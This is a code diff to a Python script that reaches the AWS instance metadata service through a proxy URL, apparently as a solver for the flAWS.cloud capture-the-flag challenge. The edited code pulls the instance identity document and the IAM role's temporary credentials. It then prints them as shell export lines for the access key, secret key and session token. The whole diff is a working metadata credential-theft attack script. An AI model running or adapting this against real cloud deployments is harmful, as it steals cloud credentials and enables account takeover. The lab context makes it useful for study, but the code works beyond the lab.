@@ -65,6 +65,8 @@ class IMDS:
         self.data = Mem()
         self.sess = requests.Session()
 
+        print(f'[+] IMDS at {"/".join([self.proxy_url, self.imds_url])}')
+
     def __str__(self):
         """dump the data"""
         return str(self.data)
@@ -152,11 +154,12 @@ elif args.creds:
     # long term keys, identified by AKIA*
     #
     imds.spider('latest/dynamic/instance-identity', 'document', spider=False)
-    imds.spider('latest/meta-data/identity-credentials/ec2/security-credentials', 'ec2-instance', spider=False)
-    imds.spider('latest/meta-data/iam/security-credentials', 'flaws', spider=False)
+    # imds.spider('latest/meta-data/identity-credentials/ec2/security-credentials', 'ec2-instance', spider=False)
+    imds.spider('latest/meta-data/iam','security-credentials', spider=True)
 
     ec2 = imds.data.mem["latest/dynamic/instance-identity/document"]
-    id1 = imds.data.mem["latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]
+    # id1 = imds.data.mem["latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]
+    role= imds.data.mem["latest/meta-data/iam/security-credentials"]
     id2 = imds.data.mem["latest/meta-data/iam/security-credentials/flaws"]
 
     # https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html
@@ -164,12 +167,13 @@ elif args.creds:
     print('echo Copy these aws cli credentials for http://flAWS.cloud challenge')
     print(f'export ACCOUNT_ID={ec2["accountId"]}')
     print(f'export INSTANCE_ID={ec2["instanceId"]}')
-    print(f'export AWS_DEFAULT_REGION={ec2["region"]}')
+    print(f'export AWS_REGION={ec2["region"]}')
+    print(f'export ROLE={role}') 
     #
-    print('# profile ec2-instance')
-    print(f'export AWS_ACCESS_KEY_ID={id1["AccessKeyId"]}')
-    print(f'export AWS_SECRET_ACCESS_KEY={id1["SecretAccessKey"]}')
-    print(f'export AWS_SESSION_TOKEN={id1["Token"]}')
+    # print('# profile ec2-instance')
+    # print(f'export AWS_ACCESS_KEY_ID={id1["AccessKeyId"]}')
+    # print(f'export AWS_SECRET_ACCESS_KEY={id1["SecretAccessKey"]}')
+    # print(f'export AWS_SESSION_TOKEN={id1["Token"]}')
     #
     print('# profile flaws')
     print(f'export AWS_ACCESS_KEY_ID={id2["AccessKeyId"]}')
